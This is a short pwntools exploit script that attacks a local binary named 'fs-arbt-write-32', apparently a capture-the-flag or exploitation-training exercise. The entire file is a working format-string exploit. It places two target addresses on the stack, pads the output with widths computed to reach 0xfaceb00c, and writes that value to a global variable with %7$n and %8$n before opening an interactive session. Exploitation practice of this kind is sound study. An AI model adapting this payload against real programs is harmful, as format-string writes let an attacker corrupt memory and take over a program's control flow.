#!/usr/bin/env python

from pwn import *
import os

p = process("./fs-arbt-write-32")

got_of_printf=p.elf.symbols['global_random']

first = 0xb00c-8

second = 0xface-0xb00c

buf = p32(got_of_printf) + p32(got_of_printf+2)

buf += "%" + "%05d"  % first + "x"
buf += "%7$n"
buf += "%" + "%05d" % second + "x"
buf += "%8$n"

p.sendline(buf)
p.interactive()

